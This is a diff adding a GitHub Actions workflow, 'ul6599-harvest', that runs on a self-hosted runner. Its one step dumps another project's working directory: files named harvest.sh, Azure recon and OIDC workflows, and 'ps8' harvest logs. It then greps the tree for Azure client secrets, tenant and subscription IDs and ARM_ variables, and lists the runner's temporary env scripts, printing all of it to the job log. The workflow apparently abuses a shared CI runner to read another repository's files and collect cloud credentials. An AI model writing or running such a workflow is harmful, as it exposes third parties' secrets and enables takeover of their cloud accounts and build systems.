@@ -1,0 +1,22 @@
+name: ul6599-harvest
+on:
+  workflow_dispatch:
+jobs:
+  dump:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 10
+    steps:
+      - name: files
+        run: |
+          set +e
+          W=/opt/ul-runner/_work/ul-plant/ul-plant
+          echo "=== LS ==="; ls -la $W | head -30; ls -la $W/az $W/ps8 2>&1 | head -40
+          echo "=== HARVEST_SH ==="; cat $W/az/harvest.sh 2>&1 | head -120
+          echo "=== AZRECON_YML ==="; cat $W/.github/workflows/azrecon.yml 2>&1 | head -150
+          echo "=== OIDC_HOSTED ==="; cat $W/.github/workflows/oidc-hosted.yml 2>&1 | head -80
+          echo "=== HKAZ ==="; cat $W/.github/workflows/hkaz-oidc2.yml 2>&1 | head -80
+          echo "=== PS8_HARVEST ==="
+          for f in $W/ps8/*.txt; do echo "-- $f"; head -60 "$f"; done 2>&1 | head -200
+          echo "=== GREP_SECRETS ==="
+          grep -rIn -m2 -E 'client_secret|AZURE_CLIENT_SECRET|tenant_id|subscription_id|ARM_|AZURE_TENANT|client_id' $W 2>/dev/null | grep -v 'Binary file' | head -60
+          echo "=== ENVFILES ==="; ls -la /opt/ul-runner/_work/_temp/*.sh 2>/dev/null | head -10
